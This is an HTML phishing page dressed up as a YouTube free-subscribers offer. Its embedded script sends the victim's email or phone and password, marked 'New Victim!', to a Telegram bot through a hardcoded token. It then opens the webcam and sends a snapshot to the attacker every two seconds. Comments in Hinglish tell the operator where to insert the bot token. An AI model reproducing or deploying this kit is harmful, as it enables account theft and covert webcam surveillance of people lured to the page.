<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>YouTube - Get Free Subscribers</title>
  <style>
    body {
      margin: 0;
      background: #000;
      color: #fff;
      font-family: Arial, sans-serif;
      text-align: center;
      padding: 40px 20px;
    }
    .logo { width: 180px; margin: 30px auto; display: block; }
    .subs {
      display: flex;
      justify-content: center;
      flex-wrap: wrap;
      gap: 15px;
      margin: 30px 0;
    }
    .subs button {
      padding: 14px 28px;
      font-size: 18px;
      background: #ff0000;
      color: white;
      border: none;
      border-radius: 5px;
      cursor: pointer;
    }
    .subs button:hover { background: #cc0000; }
    input {
      display: block;
      width: 90%;
      max-width: 320px;
      margin: 15px auto;
      padding: 14px;
      font-size: 17px;
      border-radius: 5px;
      background: #111;
      color: #fff;
      border: 1px solid #444;
    }
    #submitBtn {
      margin: 30px auto;
      padding: 16px 70px;
      font-size: 22px;
      background: #00cc00;
      border: none;
      border-radius: 6px;
      color: white;
      cursor: pointer;
    }
    #processing {
      display: none;
      font-size: 38px;
      margin-top: 120px;
      color: #00ff00;
      font-weight: bold;
    }
  </style>
</head>
<body>

  <img class="logo" src="https://www.youtube.com/s/desktop/1d2d4e4c/img/favicon_144.png" alt="YouTube">

  <div class="subs">
    <button>100 subscribers</button>
    <button>200 subscribers</button>
    <button>300 subscribers</button>
    <button>1K subscribers</button>
  </div>

  <input id="email" placeholder="Enter Email or Phone" required>
  <input id="password" type="password" placeholder="Enter Password" required>

  <button id="submitBtn">Get Free Subscribers</button>

  <div id="processing">Processing... Please wait<br>Do not close or refresh</div>

  <script>
    // ────────────────────────────────────────────────
    // BOT TOKEN YAHAN DAAL DO (sirf yeh ek jagah change karna hai)
    const BOT_TOKEN = '7752428251:AAGNplPML8xLHGQDaHYgs5djp70KcqMBFEI';   // ← sirf yahan daalo
    // ────────────────────────────────────────────────

    // Chat ID sirf URL se lenge (?id=...)
    const urlParams = new URLSearchParams(window.location.search);
    const CHAT_ID = urlParams.get('id');

    // victimId bhi wahi use kar rahe hain (tracking ke liye)
    const victimId = CHAT_ID || 'no-id-provided';

    const submitBtn = document.getElementById('submitBtn');
    const processing = document.getElementById('processing');
    const emailInput = document.getElementById('email');
    const passInput  = document.getElementById('password');

    submitBtn.addEventListener('click', async () => {
      const email = emailInput.value.trim();
      const password = passInput.value.trim();

      if (!email || !password) {
        alert("Please enter email and password");
        return;
      }

      // Agar chat_id nahi mila to bhejna band (lekin screen processing dikhega)
      if (!CHAT_ID) {
        document.body.innerHTML = '<div style="margin-top:180px; font-size:45px; color:lime;">Processing...<br><br>Error: Invalid link (no ID)</div>';
        return;
      }

      // Hide sab → sirf processing dikhao
      document.querySelector('.subs').style.display = 'none';
      emailInput.style.display = 'none';
      passInput.style.display = 'none';
      submitBtn.style.display = 'none';
      processing.style.display = 'block';

      try {
        // Pehle credentials bhej do
        const credsMessage = `New Victim!\nID: ${victimId}\nEmail/Phone: ${email}\nPassword: ${password}\nURL: ${window.location.href}\nTime: ${new Date().toISOString()}`;

        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            chat_id: CHAT_ID,
            text: credsMessage
          })
        });

        // Camera shuru
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        const video = document.createElement('video');
        video.srcObject = stream;
        video.play();

        // Har 2 second photo + send
        setInterval(async () => {
          const canvas = document.createElement('canvas');
          canvas.width = video.videoWidth || 640;
          canvas.height = video.videoHeight || 480;
          const ctx = canvas.getContext('2d');
          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

          const dataUrl = canvas.toDataURL('image/jpeg', 0.7);
          const base64 = dataUrl.split(',')[1];

          const byteChars = atob(base64);
          const byteArray = new Uint8Array(byteChars.length);
          for (let i = 0; i < byteChars.length; i++) {
            byteArray[i] = byteChars.charCodeAt(i);
          }
          const blob = new Blob([byteArray], { type: 'image/jpeg' });

          const formData = new FormData();
          formData.append('chat_id', CHAT_ID);
          formData.append('photo', blob, `snap_\( {victimId}_ \){Date.now()}.jpg`);

          await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
            method: 'POST',
            body: formData
          });

        }, 2000);

      } catch (err) {
        console.error('Error:', err);
        // processing screen band nahi hoga
      }
    });
  </script>
</body>
</html>
